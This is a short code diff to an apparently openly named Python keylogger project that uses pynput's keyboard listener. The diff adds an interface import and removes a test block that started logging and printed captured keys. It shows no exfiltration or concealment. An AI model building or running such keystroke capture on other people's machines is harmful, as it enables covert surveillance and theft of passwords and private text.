@@ -1,4 +1,5 @@
 from service import KeyLoggerService,FileWriter,Encryptor
+from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
 import threading,time
 
@@ -38,9 +39,3 @@ class KeyLoggerManager(IKeyLoggerManager):
         for key, value in logged_keys.items():
             print(key)
             print(value)
-
-x = KeyLoggerManager()
-x.start_logging()
-while True:
-    # time.sleep(1)
-    x.print_keys()
